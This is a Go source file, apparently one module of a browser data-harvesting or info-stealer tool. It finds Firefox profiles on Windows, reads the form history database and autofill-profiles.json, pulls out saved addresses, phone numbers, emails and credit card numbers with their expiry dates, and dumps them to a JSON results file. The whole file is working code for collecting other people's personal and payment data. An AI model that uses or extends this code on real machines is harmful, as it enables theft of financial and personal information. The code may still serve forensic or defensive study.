//go:build windows
// +build windows

package firefox

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"time"

	_ "modernc.org/sqlite"
)

type FormHistoryEntry struct {
	FieldName string  `json:"field_name"`
	Value     string  `json:"value"`
	TimesUsed int64   `json:"times_used"`
	FirstUsed *string `json:"first_used,omitempty"`
	LastUsed  *string `json:"last_used,omitempty"`
}

type AddressEntry struct {
	Name          string  `json:"name,omitempty"`
	StreetAddress string  `json:"street_address,omitempty"`
	City          string  `json:"city,omitempty"`
	State         string  `json:"state,omitempty"`
	PostalCode    string  `json:"postal_code,omitempty"`
	Country       string  `json:"country,omitempty"`
	Tel           string  `json:"tel,omitempty"`
	Email         string  `json:"email,omitempty"`
	TimesUsed     int64   `json:"times_used"`
	LastUsed      *string `json:"last_used,omitempty"`
}

type CreditCardEntry struct {
	CardholderName string  `json:"cardholder_name,omitempty"`
	CardNumber     string  `json:"card_number,omitempty"`
	ExpiryMonth    int64   `json:"expiry_month,omitempty"`
	ExpiryYear     int64   `json:"expiry_year,omitempty"`
	TimesUsed      int64   `json:"times_used"`
	LastUsed       *string `json:"last_used,omitempty"`
}

type AutofillData struct {
	FormHistory []FormHistoryEntry `json:"form_history,omitempty"`
	Addresses   []AddressEntry     `json:"addresses,omitempty"`
	CreditCards []CreditCardEntry  `json:"credit_cards,omitempty"`
}


func copyToTemp(src string) (string, error) {
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()

	tmp, err := os.CreateTemp("", "ff-*.sqlite")
	if err != nil {
		return "", err
	}
	defer tmp.Close()

	if _, err = io.Copy(tmp, in); err != nil {
		os.Remove(tmp.Name())
		return "", err
	}
	return tmp.Name(), nil
}

func parseTime(v interface{}) *string {
	if v == nil {
		return nil
	}

	var i int64
	switch t := v.(type) {
	case int64:
		i = t
	case float64:
		i = int64(t)
	default:
		return nil
	}

	if i <= 0 {
		return nil
	}

	var ts time.Time
	digits := len(strconv.FormatInt(i, 10))

	if digits >= 16 {
		ts = time.Unix(i/1000000, (i%1000000)*1000)
	} else if digits >= 13 {
		ts = time.Unix(i/1000, (i%1000)*1000000)
	} else if digits >= 10 {
		ts = time.Unix(i, 0)
	} else {
		return nil
	}

	if ts.Year() < 1970 || ts.Year() > 2100 {
		return nil
	}

	s := ts.Local().Format("2006-01-02 15:04:05")
	return &s
}

func queryFormHistory(dbPath string) ([]FormHistoryEntry, error) {
	tmp, err := copyToTemp(dbPath)
	if err != nil {
		return nil, err
	}
	defer os.Remove(tmp)

	db, err := sql.Open("sqlite", tmp)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	result := make([]FormHistoryEntry, 0)
	for rows.Next() {
		var fieldname, value string
		var timesUsed int64
		var firstUsed, lastUsed interface{}

		if err := rows.Scan(&fieldname, &value, &timesUsed, &firstUsed, &lastUsed); err != nil {
			continue
		}

		entry := FormHistoryEntry{
			FieldName: fieldname,
			Value:     value,
			TimesUsed: timesUsed,
			FirstUsed: parseTime(firstUsed),
			LastUsed:  parseTime(lastUsed),
		}
		result = append(result, entry)
	}

	return result, nil
}

func queryAddresses(profilePath string) ([]AddressEntry, error) {
	jsonPath := filepath.Join(profilePath, "autofill-profiles.json")
	data, err := os.ReadFile(jsonPath)
	if err != nil {
		return nil, err
	}

	var jsonData struct {
		Addresses []map[string]interface{} `json:"addresses"`
	}

	if err := json.Unmarshal(data, &jsonData); err != nil {
		return nil, err
	}

	result := make([]AddressEntry, 0)
	for _, addr := range jsonData.Addresses {
		entry := AddressEntry{
			Name:          getStr(addr, "name"),
			StreetAddress: getStr(addr, "street-address"),
			City:          getStr(addr, "address-level3"),
			State:         getStr(addr, "address-level2"),
			PostalCode:    getStr(addr, "postal-code"),
			Country:       getStr(addr, "country"),
			Tel:           getStr(addr, "tel"),
			Email:         getStr(addr, "email"),
			TimesUsed:     getInt(addr, "timesUsed"),
			LastUsed:      parseTime(addr["timeLastUsed"]),
		}
		result = append(result, entry)
	}

	return result, nil
}

func queryCreditCards(profilePath string) ([]CreditCardEntry, error) {
	jsonPath := filepath.Join(profilePath, "autofill-profiles.json")
	data, err := os.ReadFile(jsonPath)
	if err != nil {
		return nil, err
	}

	var jsonData struct {
		CreditCards []map[string]interface{} `json:"creditCards"`
	}

	if err := json.Unmarshal(data, &jsonData); err != nil {
		return nil, err
	}

	result := make([]CreditCardEntry, 0)
	for _, cc := range jsonData.CreditCards {
		entry := CreditCardEntry{
			CardholderName: getStr(cc, "cc-name"),
			CardNumber:     getStr(cc, "cc-number"),
			ExpiryMonth:    getInt(cc, "cc-exp-month"),
			ExpiryYear:     getInt(cc, "cc-exp-year"),
			TimesUsed:      getInt(cc, "timesUsed"),
			LastUsed:       parseTime(cc["timeLastUsed"]),
		}
		result = append(result, entry)
	}

	return result, nil
}

func getStr(m map[string]interface{}, key string) string {
	if v, ok := m[key]; ok && v != nil {
		return fmt.Sprintf("%v", v)
	}
	return ""
}

func getInt(m map[string]interface{}, key string) int64 {
	if v, ok := m[key]; ok && v != nil {
		switch t := v.(type) {
		case int64:
			return t
		case float64:
			return int64(t)
		case string:
			if parsed, err := strconv.ParseInt(t, 10, 64); err == nil {
				return parsed
			}
		}
	}
	return 0
}

// RunAutofill is the main entry point for Firefox autofill extraction
func RunAutofill() {
	profiles := findProfiles()
	if len(profiles) == 0 {
		fmt.Println("No Firefox profiles found")
		return
	}

	result := make(map[string]AutofillData)

	for _, p := range profiles {
		name := filepath.Base(p)
		data := AutofillData{}

		// Form history
		formHistoryDB := filepath.Join(p, "formhistory.sqlite")
		if _, err := os.Stat(formHistoryDB); err == nil {
			if entries, err := queryFormHistory(formHistoryDB); err == nil && len(entries) > 0 {
				data.FormHistory = entries
				fmt.Printf("Profile %s: %d form entries\n", name, len(entries))
			}
		}

		// Addresses
		if entries, err := queryAddresses(p); err == nil && len(entries) > 0 {
			data.Addresses = entries
			fmt.Printf("Profile %s: %d addresses\n", name, len(entries))
		}

		// Credit cards
		if entries, err := queryCreditCards(p); err == nil && len(entries) > 0 {
			data.CreditCards = entries
			fmt.Printf("Profile %s: %d credit cards\n", name, len(entries))
		}

		if len(data.FormHistory) > 0 || len(data.Addresses) > 0 || len(data.CreditCards) > 0 {
			result[name] = data
		}
	}

	// Save to results directory
	exeDir, _ := os.Executable()
	resultsDir := filepath.Join(filepath.Dir(exeDir), "results")
	os.MkdirAll(resultsDir, 0755)

	outFile := filepath.Join(resultsDir, "firefox_autofill.json")
	f, err := os.Create(outFile)
	if err != nil {
		fmt.Println("Error creating output file:", err)
		return
	}
	defer f.Close()

	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	if err := enc.Encode(result); err != nil {
		fmt.Println("Error writing JSON:", err)
		return
	}

	fmt.Println("Saved Firefox autofill data to", outFile)
}